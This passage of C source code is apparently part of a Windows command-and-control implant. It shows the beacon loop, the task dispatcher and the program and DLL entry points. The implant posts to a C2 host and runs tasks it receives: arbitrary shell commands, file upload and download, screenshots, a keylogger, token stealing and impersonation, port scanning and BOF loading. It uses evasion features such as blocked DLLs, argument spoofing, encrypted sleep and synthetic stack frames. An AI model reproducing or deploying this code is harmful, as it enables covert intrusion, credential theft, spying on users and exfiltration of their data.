        /* ── Regular beacon: send encrypted body, get encrypted tasks ── */
        if (g_session_ready) {
            if (http_post_encrypted(g_c2_host, g_c2_port, g_c2_https, path,
                                    "{}", 2,
                                    g_agent_id,
                                    resp, sizeof(resp)) != 0)
                goto do_sleep;
        } else {
            if (http_post(g_c2_host, g_c2_port, g_c2_https, path,
                          "{}", 2,
                          g_agent_id, 0,
                          resp, sizeof(resp)) != 0)
                goto do_sleep;
        }

        /* Parse all pending tasks from (already-decrypted) response */
        parsed_task tasks[MAX_TASKS_PER_POLL];
        int task_count = parse_tasks(resp, tasks, MAX_TASKS_PER_POLL);
        if (task_count == 0) goto do_sleep;

        /* Allocate results buffer for all tasks */
        size_t results_cap = (size_t)(task_count + 1) * (BUF_SIZE + 256) + 256 + (4 * 1024 * 1024);
        char *results = (char *)malloc(results_cap);
        if (!results) goto do_sleep;
        size_t roff = 0;
        roff += (size_t)snprintf(results + roff, results_cap - roff, "{\"results\":[");
        int should_exit = 0;

        for (int t = 0; t < task_count; t++) {
            char args_decoded[BUF_SIZE];
            args_decoded[0] = '\0';
            if (tasks[t].arguments_b64[0]) {
                int alen = b64_decode(tasks[t].arguments_b64,
                                      (unsigned char*)args_decoded, sizeof(args_decoded)-1);
                if (alen > 0) args_decoded[alen] = '\0'; else args_decoded[0] = '\0';
            }

            char out_b64[BUF_SIZE];
            out_b64[0] = '\0';
            int success = 1;

            if (strcmp(tasks[t].command, "sleep") == 0) {
                handle_sleep_cmd(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "whoami") == 0) {
                handle_whoami(out_b64);
            } else if (strcmp(tasks[t].command, "ps") == 0) {
                handle_ps(out_b64);
            } else if (strcmp(tasks[t].command, "pwd") == 0) {
                handle_pwd(out_b64);
            } else if (strcmp(tasks[t].command, "cd") == 0) {
                handle_cd(args_decoded[0] ? args_decoded : ".", out_b64);
            } else if (strcmp(tasks[t].command, "getuid") == 0) {
                handle_getuid(out_b64);
            } else if (strcmp(tasks[t].command, "bof") == 0) {
                handle_bof(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "download") == 0) {
                handle_download(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "upload") == 0) {
                handle_upload(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "screenshot") == 0) {
                char *ss_buf = (char *)malloc(2 * 1024 * 1024);
                if (ss_buf) {
                    ss_buf[0] = '\0';
                    handle_screenshot(ss_buf, 2 * 1024 * 1024);
                    /* Use ss_buf instead of out_b64 for this result */
                    if (t > 0) roff += (size_t)snprintf(results + roff, results_cap - roff, ",");
                    roff += (size_t)snprintf(results + roff, results_cap - roff,
                        "{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":true}",
                        tasks[t].id, ss_buf);
                    free(ss_buf);
                    continue;
                }
                b64_encode((unsigned char*)"Out of memory for screenshot", 28, out_b64);
            } else if (strcmp(tasks[t].command, "portscan") == 0) {
                handle_portscan(args_decoded, out_b64, BUF_SIZE);
            } else if (strcmp(tasks[t].command, "keylogger") == 0) {
                handle_keylogger(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "steal_token") == 0) {
                handle_steal_token(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "make_token") == 0) {
                handle_make_token(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "rev2self") == 0) {
                handle_rev2self(out_b64);
            } else if (strcmp(tasks[t].command, "getprivs") == 0) {
                handle_getprivs(out_b64);
            } else if (strcmp(tasks[t].command, "runas") == 0) {
                handle_runas(args_decoded, out_b64);
            } else if (strcmp(tasks[t].command, "blockdlls") == 0) {
#if ENABLE_BLOCK_DLLS
                if (args_decoded[0] == '1' || (args_decoded[0] == 'o' && args_decoded[1] == 'n')) {
                    g_block_dlls = 1;
                    b64_encode((unsigned char*)"BlockDLLs enabled", 17, out_b64);
                } else {
                    g_block_dlls = 0;
                    b64_encode((unsigned char*)"BlockDLLs disabled", 18, out_b64);
                }
#else
                b64_encode((unsigned char*)"BlockDLLs not compiled in", 25, out_b64);
#endif
            } else if (strcmp(tasks[t].command, "argspoof") == 0) {
#if ENABLE_ARG_SPOOF
                if (args_decoded[0] == '1' || (args_decoded[0] == 'o' && args_decoded[1] == 'n')) {
                    g_arg_spoof = 1;
                    b64_encode((unsigned char*)"Argument spoofing enabled", 25, out_b64);
                } else {
                    g_arg_spoof = 0;
                    b64_encode((unsigned char*)"Argument spoofing disabled", 26, out_b64);
                }
#else
                b64_encode((unsigned char*)"ArgSpoof not compiled in", 24, out_b64);
#endif
            } else if (strcmp(tasks[t].command, "exit") == 0) {
                b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
                should_exit = 1;
            } else {
                char cmdline[4096] = "";
                if (strcmp(tasks[t].command, "exec") == 0 || strcmp(tasks[t].command, "shell") == 0) {
                    if (args_decoded[0]) strncpy(cmdline, args_decoded, sizeof(cmdline)-1);
                } else {
                    snprintf(cmdline, sizeof(cmdline), "%s%s%s",
                             tasks[t].command, args_decoded[0] ? " " : "", args_decoded);
                }
                if (cmdline[0]) {
                    success = (exec_cmd(cmdline, out_b64, sizeof(out_b64)) == 0);
                } else {
                    const char *msg = "Empty command";
                    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
                    success = 0;
                }
            }

            if (t > 0) roff += (size_t)snprintf(results + roff, results_cap - roff, ",");
            roff += (size_t)snprintf(results + roff, results_cap - roff,
                "{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":%s}",
                tasks[t].id, out_b64, success ? "true" : "false");
        }

        roff += (size_t)snprintf(results + roff, results_cap - roff, "]}");

        /* Send task results — encrypted if session is ready */
        if (g_session_ready) {
            http_post_encrypted(g_c2_host, g_c2_port, g_c2_https, path,
                                results, roff, g_agent_id,
                                resp, sizeof(resp));
        } else {
            http_post(g_c2_host, g_c2_port, g_c2_https, path,
                      results, roff, g_agent_id, 0,
                      resp, sizeof(resp));
        }
        free(results);

        if (should_exit) ExitProcess(0);

do_sleep:
        {
            int s = g_sleep_ms;
            if (g_jitter_pct > 0) {
                int j = (s * g_jitter_pct) / 100;
                if (j > 0) s += (rand() % (2*j+1)) - j;
            }
            if (s < 500) s = 500;

#if ENABLE_SYNTHETIC_FRAMES
            synth_frames_push();
#endif
#if ENABLE_SLEEP_ENCRYPT
            if (g_agent_id[0]) {
                heap_key_init();
                encrypted_sleep((DWORD)s);
            } else {
                Sleep((DWORD)s);
            }
#else
            Sleep((DWORD)s);
#endif
#if ENABLE_SYNTHETIC_FRAMES
            synth_frames_pop();
#endif
        }
    }
    return 0;
}

/* ── Entry point ─────────────────────────────────────────── */

#ifdef BUILD_DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    (void)lpReserved;
    if (reason == DLL_PROCESS_ATTACH) {
        g_own_module = hModule;
        CreateThread(NULL, 0, agent_loop, NULL, 0, NULL);
    }
    return TRUE;
}
#else
int main(void) {
    FreeConsole();
    agent_loop(NULL);
    return 0;
}
#endif
